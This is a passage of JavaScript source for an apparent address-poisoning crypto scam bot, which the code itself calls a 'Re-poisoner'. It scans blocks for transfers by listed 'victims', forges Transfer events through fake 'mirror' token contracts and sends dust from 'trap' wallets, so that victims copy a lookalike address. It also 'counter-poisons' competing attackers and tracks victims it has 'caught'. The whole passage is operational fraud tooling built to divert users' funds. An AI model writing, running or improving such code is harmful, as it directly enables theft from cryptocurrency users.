  const earlyMirrorRaw = computeMirrorRawValue(tx, earlyDetectedAsset, txLogs, from);

  // Helper to safely extract amount from a Transfer log
  const getLogAmount = (log) => {
    if (log && log.data && log.data.length >= 66) {
      try { return BigInt(log.data); } catch { return 0n; }
    }
    return 0n;
  };

  // 1. Direct transaction checks (O(1) lookups)
  const senderEntry = victims.get(from);
  const receiverEntry = victims.get(to);

  if (senderEntry && isCompetitivePoison(tx, senderEntry)) {
    // Victim is the sender, so earlyMirrorRaw is the victim's real transfer amount
    counterPoison(from, senderEntry, tx, earlyMirrorRaw, earlyDetectedAsset);
  }
  if (receiverEntry && isCompetitivePoison(tx, receiverEntry)) {
    // Victim is the receiver, meaning earlyMirrorRaw is the ATTACKER's amount. 
    // Pass 0n to force it to safely fallback to the queue/DB.
    counterPoison(to, receiverEntry, tx, 0n, null);
  }

  // 🚀 CACHE UPDATE: Track native ETH transfers FROM OUR TRAPS to victims
  if (tx.value && BigInt(tx.value) > 0n) {
    const victimOfTrap = trapToVictimMap.get(from);
    if (victimOfTrap) {
      recentVictimTransfers.set(victimOfTrap, { amount: BigInt(tx.value), asset: nativeSymbol, timestamp: now });
      logger.debug(`[cache] 🧠 Cached native transfer from our trap to ${victimOfTrap}: ${tx.value}`);
    }
  }

  // 2. Transfer log checks (O(1) lookups per log)
  for (const log of txLogs || []) {
    if (ourMirrorContracts.has(log.address?.toLowerCase())) continue;

    const logFrom = log.args?.from?.toLowerCase() || '';
    const logTo = log.args?.to?.toLowerCase() || '';
    const logAmount = getLogAmount(log);
    const logContract = log.address?.toLowerCase() || '';
    const logAsset = tokenAddressMap.get(logContract) || null;

    // 🚀 CACHE UPDATE: Track recent ERC20 transfers FROM OUR TRAPS to victims
    const victimOfLogTrap = trapToVictimMap.get(logFrom);
    if (logAmount > 0n && logAsset && victimOfLogTrap) {
      recentVictimTransfers.set(victimOfLogTrap, { amount: logAmount, asset: logAsset, timestamp: now });
      logger.debug(`[cache] 🧠 Cached ERC20 transfer from our trap to ${victimOfLogTrap}: ${logAmount} ${logAsset}`);
    }

    // 🚀 Determine if the log is from a known real token contract (USDC, USDT, etc.)
    // If it's NOT in our known tokens map, it's an attacker's fake Mirror contract!
    const isRealToken = tokenAddressMap.has(logContract);

    // Check if sender is our victim
    const logSenderEntry = victims.get(logFrom);
    if (logSenderEntry && isCompetitorLog(logTo, logSenderEntry)) {
      logger.info(`[competitive] 🚨 Detected forged Transfer in logs! Victim: ${logFrom} → Attacker: ${logTo}`);
      // Victim is the sender in the log, use the log's exact amount
      counterPoison(logSenderEntry.victimAddress, logSenderEntry, tx, logAmount, earlyDetectedAsset);
    }

    // Check if receiver is our victim (Attacker -> Victim)
    const logReceiverEntry = victims.get(logTo);
    if (logReceiverEntry && isCompetitorLog(logFrom, logReceiverEntry)) {
      if (!isRealToken) {
        // 🎭 Attacker used a fake mirror contract. Use the attacker's emitted amount!
        logger.info(`[competitive] 🎭 Attacker used fake mirror contract. Using attacker's emitted amount: ${logAmount}`);
        counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, logAmount, earlyDetectedAsset);
      } else {
        // 💧 Attacker sent real dust via a real token contract. Pass 0n to force DB fallback to last victim->counterparty amount.
        logger.info(`[competitive] 💧 Attacker sent real dust via ${logContract}. Will fallback to last victim->counterparty amount.`);
        counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, 0n, null);
      }
    }
  }

  // Caught victim exclusion
  if (caughtVictims.has(from)) {
    logger.info(`[DEBUG] ⏭️ ${from} is a caught victim, removing from active map`);
    victims.delete(from);
    return;
  }

  if (!victims.has(from)) {
    logger.debug(`[DEBUG] ${from} is not in our victims list, skipping`);
    return;
  }

  const entry = victims.get(from);

  // 🚀 FIX BUG #1: Extract actual recipient from ERC-20 transfer
  let actualRecipient = to;

  // Check if this is an ERC-20 transfer(address,uint256) - selector 0xa9059cbb
  if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
    // Extract recipient from input data (bytes 16-36 after 0x prefix = chars 34-74)
    actualRecipient = '0x' + tx.input.slice(34, 74).toLowerCase();
    logger.debug(`[ERC20] Detected token transfer: ${from} → ${actualRecipient} via ${to}`);
  }
  // Check if this is an ERC-20 transferFrom(address,address,uint256) - selector 0x23b872dd
  // Used by DEX routers (Uniswap, PancakeSwap, 1inch, etc.)
  else if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
    // transferFrom signature: transferFrom(address from, address to, uint256 value)
    // Extract 'to' address (second parameter) from input data (bytes 48-68 = chars 98-138)
    actualRecipient = '0x' + tx.input.slice(98, 138).toLowerCase();
    logger.debug(`[ERC20] Detected token transferFrom: ${from} → ${actualRecipient} via ${to}`);
  }

  // Counterparty wildcard check using actual recipient
  if (entry.counterparty && actualRecipient !== entry.counterparty) {
    logger.info(`[DEBUG] ⏭️ ${from} sent to ${actualRecipient} but counterparty is ${entry.counterparty} - NOT a target transaction`);
    return;
  }

  // Dynamic cooldown check
  let timestamps = victimTxTimestamps.get(from);
  if (!timestamps) {
    timestamps = [];
    victimTxTimestamps.set(from, timestamps);
  }
  timestamps.push(Date.now());

  if (timestamps.length > 10) {
    timestamps.shift();
  }

  const dynamicCooldown = getDynamicCooldown(from);
  if (now - entry.lastPoison < dynamicCooldown) {
    const remaining = Math.round((dynamicCooldown - (now - entry.lastPoison)) / 1000);
    logger.info(`[DEBUG] ⏭️ ${from} on cooldown (${remaining}s remaining, need ${Math.round(dynamicCooldown / 1000)}s)`);
    return;
  }

  // 🚀 PREVENT CONCURRENT PYTHON SPAWNS
  if (trapLocks.get(entry.privateKey)) {
    logger.info(`[DEBUG] ⏭️ Trap wallet for victim ${from} is currently busy. Skipping.`);
    return;
  }
  trapLocks.set(entry.privateKey, true);

  // ─── Detect asset from the transaction ───
  const detectedAsset = getAssetFromTx(tx);
  if (detectedAsset) {
    logger.info(`[asset] Detected asset for re-poison: ${detectedAsset}`);
  } else {
    logger.info('[asset] No specific asset detected, will fallback to USDC/USDT');
  }

  // Async Execution
  (async () => {
    try {
      const counterpartyMsg = entry.counterparty ? entry.counterparty : "[WILDCARD TARGET]";
      logger.info(`Victim ${from} sent to ${counterpartyMsg}: ${tx.hash}`);

      try {
        const victimUrl = getExplorerUrl(from);
        const counterpartyUrl = entry.counterparty ? getExplorerUrl(entry.counterparty) : '';
        const txUrl = getExplorerUrl(tx.hash, 'tx');

        const alertMsg = `🔔 *Victim targeting counterparty*\n\n` +
          `👤 Victim: \`${from}\`\n🔗 ${victimUrl}\n\n` +
          `🎯 Counterparty: \`${counterpartyMsg}\`\n${counterpartyUrl ? `🔗 ${counterpartyUrl}\n` : ''}\n` +
          `🔗 TX: ${txUrl}`;

        await sendAlert(alertMsg, 'info', entry.campaignId);
      } catch (alertErr) {
        logger.warn(`Failed to send initial alert: ${alertErr.message}`);
      }

      // 🚀 VECTOR 1: Queue forged Transfer event for batch processing (ALWAYS USE BATCH)
      let mirrorRaw = computeMirrorRawValue(tx, detectedAsset);
      let mirrorAsset = detectedAsset || 'ETH';
      let mirrorQueued = false;

      // 🚀 FIX: If no amount detected from tx, use fallbacks to ensure batch is used
      if (mirrorRaw === 0n) {
        const recent = recentVictimTransfers.get(from.toLowerCase());
        if (recent && recent.amount > 0n) {
          mirrorRaw = recent.amount;
          mirrorAsset = recent.asset;
          logger.info(`[mirror] Using cache fallback for batch: ${mirrorRaw} ${mirrorAsset}`);
        }
      }

      if (mirrorRaw === 0n && entry.counterparty) {
        const chainResult = await fetchLastTransferFromChain(from.toLowerCase(), entry.counterparty.toLowerCase());
        if (chainResult && chainResult.amount > 0n) {
          mirrorRaw = chainResult.amount;
          mirrorAsset = chainResult.asset;
          logger.info(`[mirror] Using blockchain fallback for batch: ${mirrorRaw} ${mirrorAsset}`);
        }
      }

      if (mirrorRaw === 0n && supabaseService) {
        try {
          const { data: trapData } = await supabaseService
            .from('traps')
            .select('last_transfer_amount, last_transfer_asset')
            .eq('victim_address', from.toLowerCase())
            .eq('counterparty_address', entry.counterparty?.toLowerCase())
            .limit(1)
            .maybeSingle();

          if (trapData && trapData.last_transfer_amount && trapData.last_transfer_asset) {
            const realAmount = trapData.last_transfer_amount;
            const realAsset = trapData.last_transfer_asset;
            let rawValue = 0n;
            const amountStr = String(realAmount).trim();
            if (amountStr.startsWith('0x')) {
              rawValue = BigInt(amountStr);
            } else if (amountStr.includes('.')) {
              const decimals = getDecimals(realAsset);
              const parts = amountStr.split('.');
              const whole = BigInt(parts[0] || '0');
              const fracStr = (parts[1] || '').padEnd(decimals, '0').slice(0, decimals);
              rawValue = whole * (10n ** BigInt(decimals)) + BigInt(fracStr || '0');
            } else {
              rawValue = BigInt(amountStr);
            }
            if (rawValue > 0n) {
              mirrorRaw = rawValue;
              mirrorAsset = realAsset;
              logger.info(`[mirror] Using DB fallback for batch: ${mirrorRaw} ${mirrorAsset}`);
            }
          }
        } catch (e) { }
      }

      if (mirrorRaw === 0n) {
        mirrorRaw = BigInt('1000000000000000000'); // 1 ETH
        mirrorAsset = 'ETH';
        logger.info(`[mirror] Using default 1 ETH fallback for batch`);
      }

      // Cache the resolved amount for counter-poisons
      recentVictimTransfers.set(from.toLowerCase(), { amount: mirrorRaw, asset: mirrorAsset, timestamp: Date.now() });

      let mirrorContractAddress =
        MIRROR_CONTRACTS[mirrorAsset] ||
        MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] ||
        MIRROR_TOKEN_NATIVE;

      const campaignWallet = campaignMirrorWallets.get(entry.campaignId);
      if (campaignWallet && mirrorContractAddress) {
        queuePoison(
          entry.campaignId,
          mirrorContractAddress,
          from,
          entry.trapAddress,
          mirrorRaw,
          'auto',
          entry,
          mirrorAsset
        );
        mirrorQueued = true;
        logger.info(`[mirror] Queued auto-poison for batch via ${mirrorContractAddress.slice(0, 10)}...`);
      } else {
        logger.warn(`[mirror] No funding wallet or contract found for ${mirrorAsset}, batch skipped.`);
      }

      // 🚀 FIX: NEVER call duster.py for auto-triggers. Batch only.
      if (mirrorQueued) {
        logger.info(`[skip-dust] Auto-poison queued for batch. Skipping duster.py completely.`);
      } else {
        logger.warn(`[fallback] Batch completely unavailable for ${from}. Skipping auto-poison to save trap funds.`);
      }

    } catch (err) {
      logger.error(`Error in async poison task for ${from}: ${err.message}`);
    } finally {
      trapLocks.delete(entry.privateKey);
    }
  })();
}

// --- Block scanner ---
async function scanNewBlocks() {
  if (isScanning) return;
  isScanning = true;

  try {
    const currentBlock = await withRpcRetry(
      () => client.getBlockNumber(),
      'getBlockNumber',
      2,
      1000
    );

    if (lastBlockProcessed === 0n) {
      lastBlockProcessed = currentBlock > 2n ? currentBlock - 2n : 0n;
      console.log(`[DEBUG] Initial block set to ${lastBlockProcessed}`);
      isScanning = false;
      return;
    }

    let startBlock = lastBlockProcessed + 1n;
    let endBlock = currentBlock;
    const blockDiff = Number(endBlock - startBlock);

    // 🚀 Use chain-specific max blocks
    if (blockDiff > scanConfig.maxBlocksPerScan) {
      logger.warn(`Fell behind by ${blockDiff} blocks. Capping to latest ${scanConfig.maxBlocksPerScan} blocks.`);
      startBlock = currentBlock - BigInt(scanConfig.maxBlocksPerScan) + 1n;
    }

    if (startBlock <= endBlock) {
      // 🚀 Fetch blocks in parallel for speed (up to 5 at a time)
      const blockNumbers = [];
      for (let b = startBlock; b <= endBlock; b++) {
        blockNumbers.push(b);
      }

      const batchSize = 5;
      for (let i = 0; i < blockNumbers.length; i += batchSize) {
        const batch = blockNumbers.slice(i, i + batchSize);
        const blocks = await Promise.all(
          batch.map(block =>
            withRpcRetry(
              () => client.getBlock({ blockNumber: block, includeTransactions: true }),
              `getBlock(${block})`,
              2,
              1000
            ).catch(err => {
              logger.warn(`Failed to fetch block ${block}: ${err.message}`);
              return null;
            })
          )
        );

        let highestSuccessfulBlock = lastBlockProcessed;

        // 🚀 SCALE FIX: Single getLogs call + O(1) lookups (No more 1000+ RPC calls)
        let batchLogs = [];
        if (victims.size > 0) {
          try {
            const fromBlock = batch[0];
            const toBlock = batch[batch.length - 1];

            // Fetch ALL Transfer logs for this block batch in ONE call
            // (Max 10,000 logs per call on Alchemy/Infura, 10 blocks is well under this)
            const rawLogs = await client.request({
              method: 'eth_getLogs',
              params: [{
                fromBlock: `0x${fromBlock.toString(16)}`,
                toBlock: `0x${toBlock.toString(16)}`,
                topics: ['0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef']
              }]
            }).catch(() => []);

            // Format logs for checkTransaction
            batchLogs = rawLogs.map(log => ({
              address: log.address,
              blockNumber: BigInt(log.blockNumber),
              transactionHash: log.transactionHash,
              args: {
                from: '0x' + log.topics[1].slice(26),
                to: '0x' + log.topics[2].slice(26),
              }
            }));
          } catch (logErr) {
            logger.warn(`Failed to fetch logs for batch: ${logErr.message}`);
          }
        }

        for (let i = 0; i < blocks.length; i++) {
          const fullBlock = blocks[i];
          const blockNum = batch[i];
          if (fullBlock && fullBlock.transactions) {
            // Get logs for this specific block
            const blockLogs = batchLogs.filter(l =>
              l.blockNumber && BigInt(l.blockNumber) === blockNum
            );

            for (const tx of fullBlock.transactions) {
              try {
                // Attach logs to transaction for forged/mirror detection
                const txLogs = blockLogs.filter(l =>
                  l.transactionHash?.toLowerCase() === tx.hash?.toLowerCase()
                );
                checkTransaction(tx, txLogs);
              } catch (err) {
                logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
              }
            }
            highestSuccessfulBlock = BigInt(blockNum);
          } else {
            break;
          }
        }
        lastBlockProcessed = highestSuccessfulBlock;
      }
    }
  } catch (err) {
    logger.warn(`Block scan error: ${err.message}`);
  } finally {
    isScanning = false;
  }
}

// --- Start watcher ---
let watcherStarted = false;

function startWatcher() {
  if (watcherStarted) {
    console.log('[DEBUG] Watcher already started, skipping...');
    return;
  }
  watcherStarted = true;

  console.log('[DEBUG] Starting block‑based watcher...');
  logger.info(`Watching new blocks for victim → counterparty transactions (poll every ${scanConfig.pollIntervalMs / 1000}s)...`);

  (async () => {
    try {
      lastBlockProcessed = await client.getBlockNumber();
      console.log(`[DEBUG] Starting from block ${lastBlockProcessed}`);
    } catch (e) {
      console.error(`[DEBUG] Failed to get initial block: ${e.message}`);
    }
  })();

  // 🚀 Chain-aware polling interval
  blockPollInterval = setInterval(scanNewBlocks, scanConfig.pollIntervalMs);

  // Keep caught victims poll at 8 minutes
  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 480000);

  // 🚀 No more polling! Real-time subscription handles new traps
  console.log('[DEBUG] Trap polling disabled - using real-time subscription instead');

  console.log(`[DEBUG] Watcher started. Polling every ${scanConfig.pollIntervalMs / 1000}s, max ${scanConfig.maxBlocksPerScan} blocks per scan.`);
} // <--- THIS IS THE MISSING CLOSING BRACE FOR startWatcher()

// --- Graceful shutdown ---
setupGracefulShutdown();

onShutdown(async () => {
  console.log('[DEBUG] Shutting down...');
  if (blockPollInterval) clearInterval(blockPollInterval);
  if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
  if (trapsReloadInterval) clearInterval(trapsReloadInterval);
  if (realtimeSubscription) {
    await realtimeSubscription.unsubscribe();
    console.log('[DEBUG] Realtime subscription closed');
  }
  console.log('[DEBUG] All resources cleaned up.');

  let totalQueued = 0;
  for (const items of poisonQueue.values()) totalQueued += items.length;
  if (totalQueued > 0) {
    console.log(`[DEBUG] Flushing ${totalQueued} queued poisons before shutdown...`);
    await flushAllQueues();
  }
});

// --- Main ---
(async function () {
  console.log('[DEBUG] Loading traps from database...');

  var loaded = await loadTrapsFromDB();

  if (loaded === 0) {
    logger.error('No victims loaded from database. Exiting.');
    console.error('[DEBUG] No victims loaded. Exiting.');
    process.exit(1);
  }

  await loadCaughtVictims();

  // Subscribe to new traps in real-time
  subscribeToNewTraps();

  console.log('[DEBUG] Starting watcher...');
  startWatcher();
  logger.info('Re-poisoner is running. Press Ctrl+C to stop.');
})();